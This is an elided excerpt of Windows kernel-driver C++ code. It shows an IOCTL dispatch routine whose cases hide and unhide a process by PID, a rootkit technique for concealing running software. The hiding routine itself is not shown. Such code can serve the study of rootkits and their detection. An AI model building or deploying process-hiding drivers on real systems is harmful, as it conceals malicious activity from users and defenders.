...
NTSTATUS device_ioctl(PDEVICE_OBJECT device_object, PIRP irp) {
	...
	break;
	case HIDE_PROCESS_IOCTL:
	{
		if (input_buffer_length != sizeof ProcessHideArgs) {
			nt_status = STATUS_INVALID_PARAMETER;
			break;
		}
		auto args = static_cast<ProcessHideArgs*>(irp->AssociatedIrp.SystemBuffer);
		nt_status = hide_process(args->pid);
	}
	break;
	case UNHIDE_PROCESS_IOCTL:
	{
		if (input_buffer_length != sizeof ProcessHideArgs) {
			nt_status = STATUS_INVALID_PARAMETER;
			break;
		...
		auto args = static_cast<ProcessHideArgs*>(irp->AssociatedIrp.SystemBuffer);
		nt_status = unhide_process(args->pid);
	}
	break;
	default:
	{
